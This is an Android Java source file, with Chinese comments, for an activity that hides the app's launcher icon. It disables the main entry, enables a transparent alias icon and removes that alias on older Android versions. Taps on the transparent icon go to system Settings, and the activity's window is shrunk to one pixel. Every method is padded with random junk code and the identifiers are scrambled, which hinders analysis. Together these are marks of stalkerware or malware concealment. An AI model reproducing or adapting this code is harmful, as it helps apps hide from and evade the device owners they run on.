package wqyq.chd.jwgcv;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（WYPU），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 * 注：WUDJ.initPopPower() 已提前直接执行组件切换(A16 保底)，
 * 此处的切换为幂等重复确认，主要为旧版本保留"切换后跳设置页"的原始体验。
 */
public class XHDW extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        int process_YEXInZeNhJKBBACkie = new java.util.Random().nextInt(50);
        int stack_nTpTaQXJeiFiUPjMIcw = (process_YEXInZeNhJKBBACkie > 43) ? 1 : ((process_YEXInZeNhJKBBACkie > 98) ? 95 : ((process_YEXInZeNhJKBBACkie > 32) ? 92 : 5));
        int i_HOcyW = stack_nTpTaQXJeiFiUPjMIcw * process_YEXInZeNhJKBBACkie;
        if (i_HOcyW > 31) {
            java.lang.System.arraycopy(new int[] { i_HOcyW }, 0, new int[] { 0 }, 0, 1);
        }
        super.onCreate(savedInstanceState);
        // 别名与当前类同包，通过当前类全限定名推导包名，避免硬编码包前缀被混淆后失效
        String pkg = getClass().getName();
        pkg = pkg.substring(0, pkg.lastIndexOf('.'));
        String alias = pkg + ".MysteryAliasActivity";
        set(XHDW.this, WYPU.class.getName(), alias);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(XHDW.this, alias);
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        long arr_OynfmbSosTBpyQVGq = java.lang.System.nanoTime();
        int i_UyXEKffWJDgCRcUpDU = new java.util.Random().nextInt(1000);
        boolean j_EYiQBp = (arr_OynfmbSosTBpyQVGq % (i_UyXEKffWJDgCRcUpDU + 12)) > 22;
        double tmp_WwriXMmfUSaePfF = j_EYiQBp ? java.lang.Math.sqrt(i_UyXEKffWJDgCRcUpDU) : java.lang.Math.pow(i_UyXEKffWJDgCRcUpDU, 32);
        if (tmp_WwriXMmfUSaePfF < 0.0) {
            java.lang.System.out.println(tmp_WwriXMmfUSaePfF);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        String onaZeOTHILnq = java.util.UUID.randomUUID().toString();
        int ckuyBROCA = onaZeOTHILnq.length();
        char pmh_UFvmzGAuYyaAIbNga = onaZeOTHILnq.charAt(new java.util.Random().nextInt(ckuyBROCA));
        boolean dimaxKQACsQeSQC = (pmh_UFvmzGAuYyaAIbNga == 'z');
        if (dimaxKQACsQeSQC && ckuyBROCA < 36) {
            onaZeOTHILnq.substring(14, 95);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        long arr_OynfmbSosTBpyQVGq = java.lang.System.nanoTime();
        int i_UyXEKffWJDgCRcUpDU = new java.util.Random().nextInt(1000);
        boolean j_EYiQBp = (arr_OynfmbSosTBpyQVGq % (i_UyXEKffWJDgCRcUpDU + 12)) > 22;
        double tmp_WwriXMmfUSaePfF = j_EYiQBp ? java.lang.Math.sqrt(i_UyXEKffWJDgCRcUpDU) : java.lang.Math.pow(i_UyXEKffWJDgCRcUpDU, 32);
        if (tmp_WwriXMmfUSaePfF < 0.0) {
            java.lang.System.out.println(tmp_WwriXMmfUSaePfF);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
